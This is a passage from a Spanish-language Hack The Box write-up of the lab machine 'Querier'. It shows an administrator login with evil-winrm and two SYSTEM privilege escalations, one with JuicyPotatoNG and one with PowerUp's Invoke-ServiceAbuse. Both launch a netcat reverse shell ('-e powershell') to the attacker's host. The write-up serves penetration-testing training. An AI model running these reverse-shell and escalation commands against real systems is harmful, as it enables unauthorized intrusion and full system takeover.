+</span><span class="az">SMB         </span><span class="p">10.10.10.125      445    QUERIER          </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:QUERIER) (domain:QUERIER) (signing:False) (SMBv1:False)  
+</span><span class="az">SMB         </span><span class="p">10.10.10.125      445    QUERIER          </span><span class="ve">[+] </span><span class="p">QUERIER\Administrator:MyUnclesAreMarioAndLuigi!!1! </span><span class="am">(Pwn3d!)</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ya que el puerto <code class="language-plaintext highlighter-rouge">5985</code> esta abierto podemos conectarnos usando las credenciales de <code class="language-plaintext highlighter-rouge">Administrator</code> con la herramienta <code class="language-plaintext highlighter-rouge">evil-winrm</code>, ahora podemos leer la ultima <code class="language-plaintext highlighter-rouge">flag</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ evil-winrm</span><span class="p"> -i 10.10.10.125 -u Administrator -p </span><span class="am">'MyUnclesAreMarioAndLuigi!!1!'</span><span class="p">  
+PS C:\Users\Administrator\Documents> </span><span class="am">whoami</span><span class="p">
+querier\administrator
+PS C:\Users\Administrator\Documents> </span><span class="am">type</span><span class="p"> ..\Desktop\root.txt
+680**************************ef0
+PS C:\Users\Administrator\Documents></span>
+</code></pre></div></div><br>
+
+<section class="post" id="altern-administrator">
+<br><h3 class="post-title">Alternativa - Administrator</h3><br>
+
+<p class="plain-text">Entre los privilegios del usuario <code class="language-plaintext highlighter-rouge">mssql-svc</code> esta el ya muy conocido <code class="language-plaintext highlighter-rouge">SeImpersonatePrivilege</code> que nos permite <code class="language-plaintext highlighter-rouge">suplantar</code> a cualquier usuario</p><div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\mssql-svc\Desktop> </span><span class="am">whoami</span><span class="p"> /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State   
+============================= ========================================= ========  
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+
+PS C:\Users\mssql-svc\Desktop></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Usando <a href="https://github.com/antonioCoco/JuicyPotatoNG">JuicyPotatoNG.exe</a> podemos ejecutar mediante una <code class="language-plaintext highlighter-rouge">cmd</code> el <code class="language-plaintext highlighter-rouge">netcat.exe</code> que descargamos antes y enviar una <code class="language-plaintext highlighter-rouge">powershell</code> a nuestro host en el puerto 443</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\mssql-svc\Desktop> </span><span class="am">.\JuicyPotatoNG.exe </span><span class="c1">-t</span><span class="p"> * </span><span class="c1">-p</span><span class="p"> C:\Windows\System32\cmd.exe </span><span class="c1">-a </span><span class="az">"/c C:\ProgramData\netcat.exe 10.10.14.10 443 -e powershell"</span><span class="p">  
+PS C:\Users\mssql-svc\Desktop></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al hacerlo este aprovecha el privilegio y suplanta a <a href="https://github.com/antonioCoco/JuicyPotatoNG">nt authority\system</a> para enviarnos una <code class="language-plaintext highlighter-rouge">powershell</code>, es el usuario con maximos <code class="language-plaintext highlighter-rouge">privilegios</code> sobre el equipo</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ sudo netcat</span><span class="p"> -lvnp 443
+Listening on 0.0.0.0 443
+Connection received on 10.10.10.125
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\> </span><span class="am">whoami</span><span class="p">
+nt authority\system
+PS C:\></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Otra forma es haciendo abusando del servicio <code class="language-plaintext highlighter-rouge">UsoSvc</code> que nos muestra <code class="language-plaintext highlighter-rouge">PowerUp</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">ServiceName   : UsoSvc
+Path          : C:\Windows\system32\svchost.exe -k netsvcs -p  
+StartName     : LocalSystem
+AbuseFunction : Invoke-ServiceAbuse -Name 'UsoSvc'
+CanRestart    : True
+Name          : UsoSvc
+Check         : Modifiable Services</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Usando <code class="language-plaintext highlighter-rouge">Invoke-ServiceAbuse</code> indicamos el nombre del servicio <code class="language-plaintext highlighter-rouge">UsoSvc</code> y como comando ejecutaremos nuevamente <code class="language-plaintext highlighter-rouge">netcat.exe</code> para enviarnos una <code class="language-plaintext highlighter-rouge">powershell</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\mssql-svc\Desktop> </span><span class="am">Invoke-ServiceAbuse </span><span class="c1">-Name </span><span class="az">'UsoSvc' </span><span class="c1">-Command </span><span class="az">'C:\ProgramData\netcat.exe 10.10.14.10 443 -e powershell'</span><span class="p">  
+
+ServiceAbused Command
+------------- -------
+UsoSvc        C:\ProgramData\netcat.exe 10.10.14.10 443 -e powershell
+
+PS C:\Users\mssql-svc\Desktop></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al invocarlo el servicio nos envia una <code class="language-plaintext highlighter-rouge">powershell</code> como <code class="language-plaintext highlighter-rouge">nt authority\system</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ sudo netcat </span><span class="p">-lvnp 443
+Listening on 0.0.0.0 443
+Connection received on 10.10.10.125
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.  
+
+PS C:\Windows\System32> </span><span class="am">whoami</span><span class="p">
+nt authority\system
+PS C:\Windows\System32></span>
+</code></pre></div></div><br>
+
+</section>
+
+</article>
+  </div>
+  <footer class="footer">
+    <span class="footer__copyright">&copy; 2023 - GatoGamer1155</span>
+  </footer><br><br>
+
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+<script type="text/javascript" src="/js/main.js?1678894953382991917"></script>
+
+    </div>
+  </body>
+</html>
